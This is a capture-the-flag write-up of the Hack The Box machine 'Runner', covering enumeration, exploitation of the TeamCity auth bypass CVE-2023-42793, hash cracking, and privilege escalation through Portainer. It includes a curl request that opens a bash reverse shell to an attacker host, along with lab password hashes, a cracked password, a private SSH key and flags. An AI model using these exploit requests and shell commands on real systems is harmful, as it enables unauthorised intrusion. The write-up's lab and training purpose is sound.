# Initial Enumeration

We will start by enumerating the entry point IP via NMAP to footprint the running services.

```
PORT     STATE SERVICE     REASON         VERSION
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp   open  http        syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8000/tcp open  nagios-nsca syn-ack ttl 63 Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=4/30%OT=22%CT=%CU=40895%PV=Y%DS=2%DC=T%G=N%TM=6630C453%P=x86_64-pc-linux-gnu)
SEQ(SP=10A%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 30.019 days (since Sun Mar 31 11:46:26 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=266 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we see a SSH service, and 2 HTTP services.

&nbsp;

# SSH

As usual the SSH is not out initial entry point, brute force won't be a intended way in so I will move on momently and come back as soon I find a valid set of credentials.

&nbsp;

# HTTP

On the standard port 80 we can see that the machine is running a VHOST on runner.htb so let's add that to out local hosts file and move on.

I will start by checking presence of other hidden VHOST on the machine:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://runner.htb/ -H "Host:FUZZ.runner.htb" -fl 8

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 1052 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
```

And also for hidden folders?

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# dirsearch -u "http://runner.htb/"

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                                                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/aleksandar/Downloads/reports/http_runner.htb/__24-04-30_12-23-05.txt

Target: http://runner.htb/

[12:23:05] Starting:                                                                                                                                                                                                                                         
[12:23:22] 301 -  178B  - /assets  ->  http://runner.htb/assets/            
[12:23:22] 403 -  564B  - /assets/                                          
                                                                             
Task Completed
```

&nbsp;

# PORT 8000

This port seems identified as Nagios NCSA service but seems not surfable?

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# dirsearch -u "http://runner.htb:8000/"

  _|. _ _  _  _  _ _|_    v0.4.3.post1                                                                                                                                                                                                                       
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                             
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/aleksandar/Downloads/reports/http_runner.htb_8000/__24-04-30_12-24-36.txt

Target: http://runner.htb:8000/

[12:24:36] Starting:                                                                                                                                                                                                                                         
[12:25:05] 200 -    3B  - /health                                           
[12:25:43] 200 -    9B  - /version                                          
                                                                             
Task Completed
```

Seems like it isn't showing up much more, I think we need to go back on drawing tables.

&nbsp;

# Back on HTTP Service

Seem like I need to fuzz deeper for VHOST since we need to find another VHOST that we have  missed with the stanbdard list, and on forum got tipsed to use a custom list created with Cewl:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# cewl -d 3 -m 3 http://runner.htb/ -w wordlist.cewl                                                                                                                                                                                                       
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

And now we can find another VHOST:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads]
└─# ffuf -w wordlist.cewl -u http://runner.htb/ -H "Host:FUZZ.runner.htb" -fw 4

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /home/aleksandar/Downloads/wordlist.cewl
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 4
________________________________________________

TeamCity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 40ms]
:: Progress: [285/285] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

This allows us to reach the new subdomain:

![25fc4fa6ee666c7abb7cbe509b3bdb63.png](../../../_resources/25fc4fa6ee666c7abb7cbe509b3bdb63.png)

We can see the version running is pretty new, but still not the newest (Version 2023.05.3 (build 129390) ).

And googling around seems like there are several CVE that leverages on over a path trasveral to archive a authentication bypass: https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

But booth seems like not working so let's google the exact version of the running version and check what can we find?

https://github.com/vulhub/vulhub/blob/master/teamcity/CVE-2023-42793/README.md

This seems indeed the one we are targeting!

First we need to request a new API token.

![d73fff5206d2b0c2773be64582bf69bf.png](../../../_resources/d73fff5206d2b0c2773be64582bf69bf.png)

Next we need to associate the new API token and enable the debug mode.

![28679170d0eaefde5cbb634d8828340f.png](../../../_resources/28679170d0eaefde5cbb634d8828340f.png)

Lastly we should be able to gain rce?

![c30e9824da182197a30d1de91f9c0af4.png](../../../_resources/c30e9824da182197a30d1de91f9c0af4.png)

Now we need to try to gain access via RCE! But the command was failing cause I wasn't able to pass the params. Checking here we can see that &params= need to be shipped separately:

https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/

![367c3f3029c2f0008865b2b7e90c6c0c.png](../../../_resources/367c3f3029c2f0008865b2b7e90c6c0c.png)

Now we should be able to get a rce! We can see that the application runs under /opt/teamcity...

![6ad3d6156f329e5bc4e111f7765a5cb8.png](../../../_resources/6ad3d6156f329e5bc4e111f7765a5cb8.png)

That config folder seems interesting:

![fa0d614da3f8092c91649864158d6243.png](../../../_resources/fa0d614da3f8092c91649864158d6243.png)

The tomcat user is not so interesting:

```
Built-in Tomcat manager roles:
    - manager-gui    - allows access to the HTML GUI and the status pages
    - manager-script - allows access to the HTTP API and the status pages
    - manager-jmx    - allows access to the JMX proxy and the status pages
    - manager-status - allows access to the status pages only

  The users below are wrapped in a comment and are therefore ignored. If you
  wish to configure one or more of these users for use with the manager web
  application, do not forget to remove the <!.. ..> that surrounds them. You
  will also need to set the passwords to something appropriate.
-->
<!--
  <user username="admin" password="<must-be-changed>" roles="manager-gui"/>
  <user username="robot" password="<must-be-changed>" roles="manager-script"/>
-->
<!--
  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
</tomcat-users>

StdErr: 
Exit code: 0
Time: 21ms
```

After several tests seems like we need to ship several params for every params example **bash -c whoami** will be **&params=c&params=whoami**

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/CVE-2023-42793]
6 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36' -H $'Connection: close' -H $'Cache-Control: max-age=0' -H $'Content-Length: 0' -H $'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.STdjcFlNeHpNakdYczJVb2tpUkVSek5BXzdR.M2U5ZmViZmYtNjBjMy00NWVmLWFmNTgtZjE2NDBiMzY2OTZl'     $'http://teamcity.runner.htb/app/rest/debug/processes?exePath=bash&params=-c%20whoami'
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 30 Apr 2024 12:04:55 GMT
Content-Type: text/plain
Transfer-Encoding: chunked
Connection: close
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store

StdOut:
StdErr: bash: - : invalid option
Usage:  bash [GNU long option] [option] ...
        bash [GNU long option] [option] script-file ...
GNU long options:
        --debug
        --debugger
        --dump-po-strings
        --dump-strings
        --help
        --init-file
        --login
        --noediting
        --noprofile
        --norc
        --posix
        --pretty-print
        --rcfile
        --restricted
        --verbose
        --version
Shell options:
        -ilrsD or -c command or -O shopt_option         (invocation only)
        -abefhkmnptuvxBCHP or -o option

Exit code: 2
Time: 18ms
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/CVE-2023-42793]
6 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36' -H $'Connection: close' -H $'Cache-Control: max-age=0' -H $'Content-Length: 0' -H $'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.STdjcFlNeHpNakdYczJVb2tpUkVSek5BXzdR.M2U5ZmViZmYtNjBjMy00NWVmLWFmNTgtZjE2NDBiMzY2OTZl'     $'http://teamcity.runner.htb/app/rest/debug/processes?exePath=bash&params=-c&params=whoami'
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 30 Apr 2024 12:05:12 GMT
Content-Type: text/plain
Transfer-Encoding: chunked
Connection: close
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store

StdOut:tcuser

StdErr: 
Exit code: 0
Time: 30ms
```

Sending something similar:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/CVE-2023-42793]
6 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36' -H $'Connection: close' -H $'Cache-Control: max-age=0' -H $'Content-Length: 0' -H $'Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.STdjcFlNeHpNakdYczJVb2tpUkVSek5BXzdR.M2U5ZmViZmYtNjBjMy00NWVmLWFmNTgtZjE2NDBiMzY2OTZl'     $'http://teamcity.runner.htb/app/rest/debug/processes?exePath=bash&params=-c&params=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F4455%200%3E%261'
```

Results in a success!

![3f91d0bb94ec5269c103b53903e8ff37.png](../../../_resources/3f91d0bb94ec5269c103b53903e8ff37.png)

&nbsp;

# Road to User.txt

Now that we have our foothold we need to identify a possible way to get a better access on the machine, possibly via SSH?

On first sight we are in a docker environment, no websites are hosted and seems like we have no other users on the machine.

But seems like I am having issues on both curl/wget so going back on the intended way seems like it is possible to gain access to the portal by using this exploit.

https://www.exploit-db.com/exploits/51884

But it never worked so I did the manual user add instead!

![b2f0159a12db5a5bae0dc3854717b498.png](../../../_resources/b2f0159a12db5a5bae0dc3854717b498.png)

And now we can login!

![a4695d18a65dab498e180d83dacd9379.png](../../../_resources/a4695d18a65dab498e180d83dacd9379.png)

Now we can see the presence of a backup copy saved locally:

&nbsp;![8b33c7e4a7bab449797d598871ee95d2.png](../../../_resources/8b33c7e4a7bab449797d598871ee95d2.png)

Checking the users we can see John/Matthew:

![2b5b8dda7c26f82958f88e46ead8dfcf.png](../../../_resources/2b5b8dda7c26f82958f88e46ead8dfcf.png)

And searching on the backup we can find the harcoded passwords:

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/Backup]
└─# grep -i -r  "matthew" *
config/_trash/AllProjects.project1/project-config.xml:  <description>Matthew's projects</description>
config/projects/AllProjects/project-config.xml.1:  <description>Matthew's projects</description>
database_dump/vcs_username:2, anyVcs, -1, 0, matthew
database_dump/users:2, matthew, $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em, Matthew, matthew@runner.htb, 1709150421438, BCRYPT
system/pluginData/audit/configHistory/projects/project1/config.xml.1:  <description>Matthew's projects</description>

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/Backup]
└─# grep -i -r  "john" *
database_dump/users:1, admin, $2a$07$neV5T/BlEDiMQUs.gM1p4uYl8xl8kvNUo4/8Aja2sAWHAQLWqufye, John, john@runner.htb, 1714468062531, BCRYPT
database_dump/comments:201, -42, 1709746543407, "New username: \'admin\', new name: \'John\', new email: \'john@runner.htb\'"
```

Seems like we can crack the matthew's password hash from the DB used by TmeCity:

```
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => 


Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
Time.Started.....: Tue Apr 30 15:37:57 2024 (5 secs)
Time.Estimated...: Tue Apr 30 17:56:36 2024 (2 hours, 18 mins)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1724 H/s (9.90ms) @ Accel:12 Loops:16 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 7632/14344385 (0.05%)
Rejected.........: 0/7632 (0.00%)
Restore.Point....: 7632/14344385 (0.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:96-112
Candidate.Engine.: Device Generator
Candidates.#1....: tilly -> albert1

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =>



$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
Time.Started.....: Tue Apr 30 15:37:57 2024 (1 min, 30 secs)
Time.Estimated...: Tue Apr 30 15:39:27 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      584 H/s (32.35ms) @ Accel:12 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 52128/14344385 (0.36%)
Rejected.........: 0/52128 (0.00%)
Restore.Point....: 51984/14344385 (0.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:112-128
Candidate.Engine.: Device Generator
Candidates.#1....: rebecka -> mogwai

Started: Tue Apr 30 15:37:54 2024
Stopped: Tue Apr 30 15:39:28 2024
```

&nbsp;

If we do a Dirtree over the archive we can find a SSHKeys?

![e924f06d9692955df104fac958f9eca7.png](../../../_resources/e924f06d9692955df104fac958f9eca7.png)

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/Backup/config/projects/AllProjects/pluginData/ssh_keys]
└─# pwd                                                                                                                                                                                                                                                      
/home/aleksandar/Downloads/Runner/Backup/config/projects/AllProjects/pluginData/ssh_keys

┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner/Backup/config/projects/AllProjects/pluginData/ssh_keys]
└─# cat id_rsa                                                                                                                                                                                                                                               
-----BEGIN OPENSSH PRIVATE KEY-----
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
KgK8c9z2ecgZsAAAALam9obkBydW5uZXI=
-----END OPENSSH PRIVATE KEY-----
```

And now using this ssh keys + Matthew password but we can't login:

![a6d38bf74b59edced0cf747c28b34c2f.png](../../../_resources/a6d38bf74b59edced0cf747c28b34c2f.png)

But then using the other user John@runner.htb we gain access to the machine and get the first flag!

```
┌──(root㉿DESKTOP-1KSM320)-[/home/aleksandar/Downloads/Runner]
└─# ssh -i matthew.ssh john@runner.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Apr 30 01:46:56 PM UTC 2024

  System load:                      0.23095703125
  Usage of /:                       82.3% of 9.74GB
  Memory usage:                     44%
  Swap usage:                       14%
  Processes:                        233
  Users logged in:                  0
  IPv4 address for br-21746deff6ac: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.13
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:afd


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Apr 30 09:39:33 2024 from 10.10.14.9
john@runner:~$ 
john@runner:~$ 
john@runner:~$ ls
user.txt
john@runner:~$ cat user.txt 
e170d81ada94ed1d31949abde15c3d6c
john@runner:~$
```

&nbsp;

# Road to Root.txt

&nbsp;Now I see that there is Matthew user as well so I will upload linpeas.sh and check what other stuff can I find?

```
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                                                                                           
                              ╚════════════════════╝                                                                                                                                                                                                         
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                                                                                                                                                           
Linux version 5.15.0-102-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #112-Ubuntu SMP Tue Mar 5 16:50:32 UTC 2024                                                                     
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.4 LTS
Release:        22.04
Codename:       jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version                                                                                                                                                                              
Sudo version 1.9.9    


═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                                                                                          
                                   ╚═══════════╝                                                                                                                                                                                                             
╔══════════╣ Container related tools present (if any):
/usr/bin/docker                                                                                                                                                                                                                                              
/usr/bin/runc
╔══════════╣ Am I Containered?
╔══════════╣ Container details                                                                                                                                                                                                                               
═╣ Is this a container? ........... No                                                                                                                                                                                                                       
═╣ Any running containers? ........ No                                                                                                                                                                                                                       



╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                                                
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                                                                                                                                                                            
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -
```

Checking manually under /root path for non-standard folder I see /root/data which seems containing Portainer? This tool is used to graphically manage containers in a docker engine.

```
john@runner:/$ cd data/
john@runner:/data$ ll
total 152
drwxr-xr-x  9 root root   4096 Feb 28 10:31 ./
drwxr-xr-x 19 root root   4096 Apr  4 10:24 ../
drwx------  2 root root   4096 Feb 28 07:51 bin/
drwx------  2 root root   4096 Feb 28 07:51 certs/
drwx------  2 root root   4096 Feb 28 07:51 chisel/
drwx------  2 root root   4096 Feb 28 07:51 compose/
drwx------  2 root root   4096 Feb 28 07:51 docker_config/
-rw-------  1 root root 131072 Apr 30 13:56 portainer.db
-rw-------  1 root root    227 Feb 28 07:51 portainer.key
-rw-------  1 root root    190 Feb 28 07:51 portainer.pub
drwxr-xr-x  4 root root   4096 Feb 28 10:31 teamcity_server/
drwx------  2 root root   4096 Feb 28 07:51 tls/
john@runner:/data$
```

Running a curl on the local port 9000 we can indeed see that it is the portained access!

![acfd39d22d5a1382b073038f1681f31d.png](../../../_resources/acfd39d22d5a1382b073038f1681f31d.png)

I will upload Ligolo-ng to gain access to the local machine so i skip the use of Sshuttle/Chisel etc

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

![ec63d5c53497f4f2c25632526f085a0f.png](../../../_resources/ec63d5c53497f4f2c25632526f085a0f.png)

Using the hardcoded address we can now access the machine as we would do via a reverse port forward via SSH or similar!

![9a48c92906bd68fda1fda9497f93411d.png](../../../_resources/9a48c92906bd68fda1fda9497f93411d.png)

Now, using Matthew:piper123 we could password spray and gain access to portainer machine!

![50e0f8955fa106478d73d7bd4067b64b.png](../../../_resources/50e0f8955fa106478d73d7bd4067b64b.png)

We can see that ubuntu image is cached locally:

![65409ea2ba5783b5d0aff09a52500feb.png](../../../_resources/65409ea2ba5783b5d0aff09a52500feb.png)

And the running containers we can see ubuntu and some more:

![3d29df9d4f64b92400315b467133dc39.png](../../../_resources/3d29df9d4f64b92400315b467133dc39.png)

Now we can see that ubuntu is using the "xxx" volume which actually is only mapped to be accessible as matthew via portainer:

![1511975276182b22bd9dc7ee595bca17.png](../../../_resources/1511975276182b22bd9dc7ee595bca17.png)

And we can execute shell commands directly on the machine itself!

![820b5345911d9fea06ae5be68fd83282.png](../../../_resources/820b5345911d9fea06ae5be68fd83282.png)

And gain the last flag!

```
79ad5b69e2284dc3f3f5e7c40df91a73
```

&nbsp;

# Intented way

In my case it was a leftover but we need to:

- Create a new volume of (type: "", device: "/", o: "bind" )
- Spinup a new container  by reusing the old container
